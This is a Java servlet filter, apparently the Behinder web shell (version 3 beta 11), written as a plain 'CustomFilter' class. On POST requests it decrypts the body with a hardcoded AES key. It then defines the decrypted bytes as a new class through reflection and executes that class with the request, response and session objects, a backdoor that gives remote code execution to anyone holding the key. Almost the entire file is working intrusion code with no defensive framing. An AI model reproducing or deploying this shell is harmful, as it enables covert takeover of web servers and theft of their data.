package com.sorry.bug;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Method;

/**
 * Behinder3 beta11
 * created by 0x22cb7139 on 2021/6/16
 */

public class CustomFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        HttpServletResponse rsp = (HttpServletResponse) servletResponse;
        rsp.setHeader("X-Geo-Country","*");
        try {
            if (req.getMethod().equals("POST")) {
                String k = "f5d7aa3ba4929cc1";
                req.getSession().setAttribute("u", k);
                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
                c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));
                java.util.Map<String, Object> pageContext = new java.util.HashMap<String, Object>();
                pageContext.put("session", req.getSession());
                pageContext.put("request", req);
                pageContext.put("response", rsp);
                java.io.BufferedReader bf = req.getReader();
                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(bf.readLine()));
                String sb = new String(evilClassBytes);
                Method defineclass= ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE,Integer.TYPE);
                defineclass.setAccessible(true);
                Class clazz = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),evilClassBytes,0,evilClassBytes.length);
                Object a = clazz.newInstance();
                a.equals(pageContext);
                return;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {
        //
    }
}
